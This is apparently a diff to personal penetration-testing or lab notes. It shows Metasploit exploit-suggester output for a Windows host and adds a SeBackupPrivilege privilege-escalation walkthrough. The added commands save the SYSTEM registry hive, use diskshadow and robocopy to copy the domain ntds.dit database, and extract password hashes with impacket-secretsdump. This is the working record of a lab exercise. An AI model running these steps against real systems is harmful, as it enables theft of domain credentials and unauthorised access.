@@ -382,3 +382,45 @@ did not work at all
  4   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.               
  5   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                                             6   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated. 
 ```
+
+
+
+https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
+
+```
+reg save hklm\system c:\temp\system
+```
+
+```
+nano backup.dsh
+set context persistent nowriters
+add volume c: alias backupz
+create
+expose %backupz% z:
+unix2dos backup.dsh
+```
+
+```
+cd C:\Temp
+upload raj.dsh
+diskshadow /s raj.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+```
+
+```
+reg save hklm\system c:\Temp\system
+cd C:\temp
+download ntds.dit
+download system
+```
+
+
+```
+impacket-secretsdump -ntds ntds.dit -system system local
+```
+
+![[Pasted image 20240930125823.png]]
+
+![[Pasted image 20240930130025.png]]
+
+amen 🙏
